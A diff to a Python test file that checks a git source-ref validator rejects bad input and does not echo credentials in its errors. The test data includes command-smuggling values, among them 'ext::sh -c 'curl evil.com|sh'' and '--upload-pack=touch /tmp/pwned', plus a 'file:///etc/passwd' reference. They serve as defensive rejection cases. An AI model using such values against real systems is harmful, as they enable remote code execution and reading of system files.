@@ -19,12 +19,22 @@ from trident.ingest.pipeline import _validate_git_source_ref, ingest
     "-", "--upload-pack=touch /tmp/pwned", "--help",
     "ext::sh -c 'curl evil.com|sh'",
     "file:///etc/passwd",
+    "https://" + "synthetic-user" + ":" + "synthetic-secret" + "@example.invalid/repo.git",
+    "https://" + "synthetic-token" + "@example.invalid/repo.git",
+    "https://example.invalid/repo.git?token=synthetic-secret",
     "",
     "not a url at all",
 ])
 def test_rejects_malicious_or_invalid_source_ref(bad_ref):
     with pytest.raises(ValueError):
         _validate_git_source_ref(bad_ref)
+
+
+def test_git_source_validation_errors_do_not_echo_credentials():
+    secret = "synthetic-secret"
+    with pytest.raises(ValueError) as exc:
+        _validate_git_source_ref("".join(("https://", "user", ":", secret, "@example.invalid/repo.git")))
+    assert secret not in str(exc.value)
 
 
 @pytest.mark.parametrize("good_ref", [
